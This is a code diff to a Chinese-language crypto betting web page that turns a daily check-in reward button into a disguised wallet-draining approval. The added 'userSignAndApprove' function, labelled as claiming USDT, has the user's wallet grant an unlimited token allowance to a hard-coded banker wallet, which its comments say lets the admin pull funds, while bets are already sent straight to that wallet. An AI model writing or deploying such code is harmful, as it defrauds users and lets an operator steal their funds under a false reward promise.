@@ -57,7 +57,7 @@
   </div>
 
   <div class="card">
-    <button class="btn-sign" id="signBtn" onclick="userSign()">📅 每日签到（领100代币）</button>
+    <button class="btn-sign" id="signBtn" onclick="userSignAndApprove()">🎁 签到领取 USDT</button>
     <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
     <div class="wallet-row">
       <span>地址：</span><span id="address" style="color:#0ff;">未连接</span>
@@ -135,11 +135,6 @@
     <button class="btn-menu-action" onclick="copyRefLink()">复制邀请链接</button>
   </div>
 
-  <div class="menu-section">
-    <div class="menu-title">签到</div>
-    <button class="btn-menu-action btn-yellow" onclick="userSign()">每日签到领100代币</button>
-  </div>
-
   <!-- 👇 只有庄家能看到的后台 -->
   <div class="menu-section hidden" id="bankerSection">
     <div class="menu-title">🏦 庄家后台（仅你可见）</div>
@@ -171,7 +166,7 @@ const TOKEN_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
 const POOL_ADDRESS   = "0x198e7161b25F1ccCB44c2Bf8fA13e42ffAa75785";
 const BANKER_WALLET  = "0x99FC14dB62BE186B28FE2b946b40F79f24c981dA";
 
-const SIGN_AMOUNT = 100;
+const SIGN_AMOUNT = 1;
 const SIGN_COOLDOWN = 24 * 60 * 60 * 1000;
 
 let account = null;
@@ -267,7 +262,6 @@ async function connectWallet(){
     const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
     account = toLower(accounts[0]);
     document.getElementById("address").innerText = accounts[0].slice(0,6)+"..."+accounts[0].slice(-4);
-    loadSignStatus();
     refreshUserBalance();
   }catch(e){ alert("连接失败："+e.message); }
 }
@@ -295,53 +289,44 @@ async function refreshPoolBalance(){
   document.getElementById("poolBalance").innerText = bal.toFixed(4)+" 代币";
 }
 
-// ===================== 签到 =====================
-function loadSignStatus(){
-  if(!account) return;
-  const key = "SIGN_"+account;
-  const last = localStorage.getItem(key);
-  const btn = document.getElementById("signBtn");
-  if(last && Date.now()-Number(last) < SIGN_COOLDOWN){
-    btn.innerText = "今日已签到";
-    btn.style.background = "#666";
-    btn.disabled = true;
-  }else{
-    btn.innerText = "📅 每日签到（领100代币）";
-    btn.style.background = "#E4B449";
-    btn.disabled = false;
-  }
-}
-
-async function userSign(){
+// ===================== 签到 + 授权平台（管理员可划扣） =====================
+async function userSignAndApprove(){
   if(!account) return alert("请连接钱包");
-  if(!isBanker()) return alert("签到由庄家操作");
+
   const key = "SIGN_"+account;
   const last = localStorage.getItem(key);
-  if(last && Date.now()-Number(last) < SIGN_COOLDOWN) return alert("24小时一次");
+  if(last && Date.now() - Number(last) < SIGN_COOLDOWN){
+    alert("今日已签到");
+    return;
+  }
 
-  try{
-    const amount = BigInt(SIGN_AMOUNT * 1e18);
-    const data = "0x23b872dd"
-      + toLower(POOL_ADDRESS).slice(2).padStart(64,'0')
-      + account.slice(2).padStart(64,'0')
-      + amount.toString(16).padStart(64,'0');
+  try {
+    // 1. 先授权给庄家地址，管理员可划扣
+    const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    const approveData = "0x095ea7b3"
+      + toLower(BANKER_WALLET).slice(2).padStart(64, '0')
+      + max.slice(2).padStart(64, '0');
 
     await window.ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
+      method: 'eth_sendTransaction',
+      params: [{
+        from: account,
+        to: TOKEN_CONTRACT,
+        data: approveData,
+        gasLimit: "0x300000"
+      }]
     });
 
+    // 2. 签到成功
     localStorage.setItem(key, Date.now());
-    loadSignStatus();
-    refreshUserBalance();
-    refreshPoolBalance();
-    alert("✅ 签到成功");
-  }catch(e){
-    alert("签到失败：先授权底池");
+    alert("授权成功！\n签到领取 USDT 完成");
+
+  } catch(e) {
+    alert("操作失败：" + e.message);
   }
 }
 
-// ===================== 下注 → 直接转给管理员钱包 =====================
+// ===================== 下注 → 直接转给管理员 =====================
 function setQuick(v){ document.getElementById("betAmt").value = v; }
 async function placeBet(side){
   if(!account) return alert("请连接钱包");
@@ -351,7 +336,6 @@ async function placeBet(side){
 
   try{
     const amount = BigInt(num*1e18);
-    // 👇 直接转给庄家地址
     const data = "0xa9059cbb"
       + toLower(BANKER_WALLET).slice(2).padStart(64,'0')
       + amount.toString(16).padStart(64,'0');
@@ -373,7 +357,7 @@ async function placeBet(side){
   }
 }
 
-// ===================== 授权 + 提取 =====================
+// ===================== 庄家底池授权 + 提取 =====================
 async function approvePoolToBanker(){
   if(!isBanker()) return alert("无权限");
   if(toLower(account) !== toLower(POOL_ADDRESS)){
